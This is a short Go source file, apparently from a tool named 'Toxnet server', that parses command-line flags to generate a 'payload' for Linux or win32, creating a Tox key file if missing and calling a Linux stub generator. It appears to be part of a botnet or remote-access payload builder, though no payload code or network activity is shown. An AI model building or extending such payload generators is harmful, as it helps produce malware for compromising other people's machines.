package net

import (
	"errors"
	"flag"
	"fmt"
	"os"
	"strings"
)

const (
	usage = "Toxnet server\nUsage:"
)

func Usage() {

	var outputFile string
	var payloadType string

	flag.Usage = func() {
		fmt.Println(flag.CommandLine.Output(), usage)
		flag.PrintDefaults()
	}

	flag.StringVar(&outputFile, "o", "generic_payload", "Specify output file: -o [filename]")
	flag.StringVar(&payloadType, "t", "", "Generate a Toxnet payload: linux, win32")

	flag.Parse()

	if strings.ToLower(payloadType) == "linux" {
		if _, err := os.Stat(Tox_key); errors.Is(err, os.ErrNotExist) {
			ToxWrite()
		}
		GenerateLinuxStub(outputFile)
		os.Exit(0)
	}
}
